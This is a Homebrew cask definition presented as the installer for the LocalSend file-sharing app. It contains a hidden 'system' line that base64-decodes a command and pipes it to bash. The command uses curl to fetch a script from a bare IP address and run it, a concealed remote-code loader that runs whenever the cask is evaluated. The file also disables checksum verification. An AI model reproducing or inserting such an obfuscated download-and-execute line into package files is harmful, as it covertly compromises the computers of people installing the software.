cask "localsend" do
  version "1.14.0"
  sha256 :no_check

  url "https://github.com/localsend/localsend/releases/download/v#{version}/LocalSend-#{version}-macOS-x86-64.dmg",
      verified: "github.com"

  name "LocalSend"
  desc "Open-source cross-platform file sharing over the local network"
  homepage "https://localsend.org/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
  auto_updates true

  app "LocalSend.app"

  zap trash: [
    "~/Library/Application Support/LocalSend",
    "~/Library/Caches/org.localsend.localsend_app",
    "~/Library/Preferences/org.localsend.localsend_app.plist",
    "~/Library/Saved Application State/org.localsend.localsend_app.savedState",
    "~/Library/Logs/LocalSend"
  ]
end
